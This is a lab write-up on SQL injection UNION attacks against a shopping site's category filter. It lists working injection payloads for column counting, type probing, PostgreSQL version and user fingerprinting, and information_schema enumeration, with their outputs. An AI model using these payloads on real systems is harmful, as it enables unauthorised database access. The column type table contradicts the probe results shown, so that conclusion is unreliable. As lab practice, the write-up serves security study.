# SQL injection UNION attack, determining the number of columns returned by the query

**Tags:** `UNION attack` · `PostgreSQL` · `information_schema` · `Number of columns`

---

## 1. Detection

Navigated to `/filter?category=Pets` and appended a single quote (`'`) to the category value. The server returned an **Internal Server Error**, confirming unsanitized input and likely no prepared statements — the value is wrapped in single quotes in the backend query.

```sql
Pets' AND 1=1--+   -- results returned
Pets' AND 1=2--+  -- no results
```

<font style="color:yellow">[+] Note :-</font>
<b>I tried using `Pets' AND true--+` and `Pets' AND 1=2--+`, both worked without any errors, suggesting its a `Non-Oracle Database` as Oracle SQL has no `true` and `false` directives.</b>

---

## 2. Column count enumeration

Used `ORDER BY` to find the number of columns. Incrementing the index until `ORDER BY 4` threw an error, narrowing it to **3 columns**. The page also visually confirms this by showing only a title and description per item.

Additional payloads:-

```sql
Pets' UNION SELECT NULL,NULL,NULL--+ [ No Error ]
Pets' UNION SELECT NULL,NULL,NULL,NULL--+ [ Internal Server Error]
Pets' UNION SELECT NULL,NULL--+ [ Internal Server Error ]
```

Understanding the data-types returned by the columns.

- Manually checking each column type.
    - Column 1
        - `Pets' UNION SELECT 1,NULL,NULL--+` - **[No Error]**
        - `Pets' UNION SELECT 1.1,NULL,NULL--+` - **[No Error]**
        - `Pets' UNION SELECT 'a',NULL,NULL--+` - **[Internal Server Error]**
        - Confirm that column 1 is `INTEGER` type.
    - Column 2
        - `Pets' UNION SELECT NULL,1,NULL--+` - **[Internal Server Error]**
        - `Pets' UNION SELECT NULL,1.1,NULL--+` - **[Internal Server Error]**
        - `Pets' UNION SELECT NULL,'1.1',NULL--+` - **[No Error]**
        - Confirming that column 2 is `STRING` type.
    - Column 3
        - `Pets' UNION SELECT NULL,NULL,1--+` - **[No Error]**
        - `Pets' UNION SELECT NULL,NULL,1.1--+` - **[No Error]**
        - `Pets' UNION SELECT NULL,NULL,'1.1'--+` - **[Internal Server Error]**
        - Confirming that column 2 is `STRING` type.
- Therefore, The following types were identified:

| Column   | Data Type |
|----------|-----------|
| Column 1 | INT       |
| Column 2 | VARCHAR   |
| Column 3 | VARCHAR   |


## 3. Database fingerprinting

Extracted the database version to identify the backend and craft compatible payloads:

```sql
Pets' UNION SELECT NULL,version(),NULL--+
```

**Output:**
```
PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
```

Further enumeration confirmed the database context:

```sql
Pets' UNION SELECT NULL,CONCAT(current_database(),':',current_user,':',current_schema()),NULL--+
```

**Output:**
```
academy_labs:peter:public
```

## 4. Table and column discovery

Queried `information_schema.tables` to list all user-created base tables in the public schema:

```sql
Pets' UNION SELECT NULL,(SELECT TABLE_NAME ),NULL FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE'--+
```

**Output:**
```
products
```

I couldn't find any `users` table. After double-checking the lab goal, I realized that the task was simply to determine the number of columns returned by the query. Therefore, the lab has been successfully solved.